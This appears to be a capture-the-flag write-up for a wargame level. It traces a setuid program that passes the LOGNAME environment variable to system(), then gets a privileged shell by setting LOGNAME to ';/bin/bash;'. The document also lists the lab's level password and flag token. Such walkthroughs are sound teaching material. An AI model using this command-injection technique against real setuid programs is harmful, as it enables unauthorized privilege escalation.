```bash
$ su level07 -> wiok45aaoguiboiki2tuin6ub
```

### Vulnerability Assessment

```bash
$ ./level07
level07
```

```bash
$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff774, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                             = 2007
geteuid()                                                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
getenv("LOGNAME")                                                                     = "level07"
asprintf(0xbffff6c4, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280)                   = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                = 0
+++ exited (status 0) +++
```

Upon examining the behavior of `level07` using `ltrace`, it is observed that the program performs several operations:

- Sets its real, effective, and saved user and group IDs to those of the executing user (`setresuid` and `setresgid`), ensuring it runs with the privileges of its owner.
- Retrieves the value of the `LOGNAME` environment variable using `getenv("LOGNAME")`.
- Executes a command that includes the value of `LOGNAME` in a call to `system`.

This sequence of actions indicates that `level07` is potentially vulnerable to command injection via the `LOGNAME` environment variable.

### Exploit

The exploit hinges on manipulating the `LOGNAME` environment variable. Since `level07` includes the value of `LOGNAME` in a `system` call, changing `LOGNAME` to a command string could lead to its execution.

The steps for the exploit are as follows:

1. Modify the `LOGNAME` environment variable to a command, such as `;/bin/bash;`.
2. Execute `level07`.

By setting `LOGNAME` to a command string, the `system` call within `level07` executes this command. This exploit is demonstrated below:

```bash
$ export LOGNAME=';/bin/bash;'
$ ./level07

```

Upon execution, `level07` runs the `/bin/bash` command, providing a shell with the privileges of the `level07` program. Within this shell, running `getflag` retrieves the token:

```bash
flag07 $ getflag
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```